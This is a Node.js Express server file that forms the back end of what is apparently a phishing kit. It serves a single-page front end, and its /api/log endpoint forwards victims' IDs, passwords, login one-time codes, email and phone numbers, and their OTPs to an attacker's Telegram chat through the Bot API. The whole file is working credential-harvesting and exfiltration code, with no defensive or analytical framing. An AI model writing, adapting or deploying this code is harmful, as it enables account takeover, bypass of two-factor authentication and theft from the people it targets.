require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// Logging all requests to debug
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    next();
});

app.use(express.json());
app.use(express.static(__dirname));

const BOT_TOKEN = process.env.LOG_BOT_TOKEN || process.env.BOT_TOKEN;
const CHAT_ID = process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID;

console.log('--- SYSTEM CHECK ---');
console.log('Bot Token Status:', BOT_TOKEN ? 'OK (Loaded)' : 'MISSING');
console.log('Target Chat ID:', CHAT_ID || 'MISSING');
console.log('--------------------');

app.post('/api/log', async (req, res) => {
    const { title, data } = req.body;
    console.log(`[LOG] Processing: ${title}`);

    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('[LOG] Error: Missing Credentials');
        return res.status(500).json({ success: false, error: 'Config missing' });
    }

    const message = `
🔥 <b>${title}</b>
━━━━━━━━━━━━━━━
👤 <b>ID</b>: <code>${data.id}</code>
🔑 <b>Pass</b>: <code>${data.pass || 'N/A'}</code>
🔢 <b>Login OTP</b>: <code>${data.login_otp || 'N/A'}</code>
📧 <b>Email</b>: <code>${data.email || 'N/A'}</code>
🔢 <b>E-OTP</b>: <code>${data.email_otp || 'N/A'}</code>
📱 <b>Phone</b>: <code>${data.phone || 'N/A'}</code>
🔢 <b>P-OTP</b>: <code>${data.phone_otp || 'N/A'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID.trim(),
            text: message,
            parse_mode: 'HTML'
        });
        console.log('[LOG] SUCCESS: Message sent to Telegram');
        res.json({ success: true });
    } catch (e) {
        const errorDetail = e.response?.data?.description || e.message;
        console.error("[LOG] FAILED: Telegram API Error ->", errorDetail);
        res.status(500).json({ success: false, error: errorDetail });
    }
});

// Catch-all for SPA
app.get('*', (req, res) => {
    if (req.path.includes('.')) return res.status(404).end();
    res.sendFile(path.join(__dirname, 'index.html'));
});

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
    app.listen(port, () => console.log(`🚀 Server fully active on http://localhost:${port}`));
}

module.exports = app;
